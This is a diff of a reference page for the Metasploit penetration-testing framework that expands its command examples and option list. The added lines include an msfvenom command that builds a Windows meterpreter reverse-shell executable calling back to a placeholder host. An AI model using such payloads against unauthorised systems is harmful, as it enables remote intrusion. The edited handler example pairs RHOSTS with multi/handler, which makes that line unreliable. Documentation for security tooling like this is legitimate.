@@ -4,29 +4,37 @@ penetration testing platform for developing, testing, and executing exploits
 
 # TLDR
 
-**Start Metasploit console**
+**Start Metasploit** console
 
 ```msfconsole```
 
-**Start without banner**
+**Start without** banner
 
 ```msfconsole -q```
 
-**Execute resource script**
+**Execute** a resource script at startup
 
 ```msfconsole -r [script.rc]```
 
-**Database initialization**
+**Initialize** the database
 
 ```msfdb init```
 
-**Run specific module**
+**Run a specific module** with inline commands
 
-```msfconsole -x "use [exploit/module]; set RHOSTS [target]; run"```
+```msfconsole -x "use [exploit/multi/handler]; set RHOSTS [target]; run"```
 
-**Generate payload**
+**Generate a payload** with msfvenom
 
-```msfvenom -p [windows/meterpreter/reverse_tcp] LHOST=[ip] LPORT=[port] -f [exe] > [payload.exe]```
+```msfvenom -p [windows/meterpreter/reverse_tcp] LHOST=[ip] LPORT=[port] -f [exe] -o [payload.exe]```
+
+**List available payloads**
+
+```msfvenom --list payloads```
+
+**Search for modules** by keyword
+
+```msfconsole -q -x "search [type:exploit] [platform:windows]"```
 
 # SYNOPSIS
 
@@ -44,10 +52,22 @@ penetration testing platform for developing, testing, and executing exploits
 > Execute command.
 
 **-o** _file_
-> Output file.
+> Output to file.
+
+**-L**
+> List all available modules, payloads, encoders, or nops.
+
+**-n** _nopsled_
+> Prepend a nopsled of given size to the payload.
 
 **-e** _encoder_
 > Encoder to use.
+
+**-p** _payload_
+> Payload to use (msfvenom).
+
+**-f** _format_
+> Output format (msfvenom): exe, elf, raw, python, c, etc.
 
 # DESCRIPTION
 
@@ -61,8 +81,11 @@ The framework includes msfconsole (interactive shell), msfvenom (payload generat
 search <term>     - Search modules
 use <module>      - Select module
 info              - Module details
+show options      - Display module options
 set <opt> <val>   - Set option
-run               - Execute
+run / exploit     - Execute module
+sessions          - List active sessions
+back              - Exit current module
 ```
 
 # CAVEATS
@@ -75,4 +98,4 @@ Metasploit was created by **H.D. Moore** in **2003** as a portable network tool.
 
 # SEE ALSO
 
-[nmap](/man/nmap)(1), [burpsuite](/man/burpsuite)(1), [sqlmap](/man/sqlmap)(1), [hydra](/man/hydra)(1)
+[nmap](/man/nmap)(1), [nikto](/man/nikto)(1), [sqlmap](/man/sqlmap)(1), [hydra](/man/hydra)(1), [wireshark](/man/wireshark)(1)
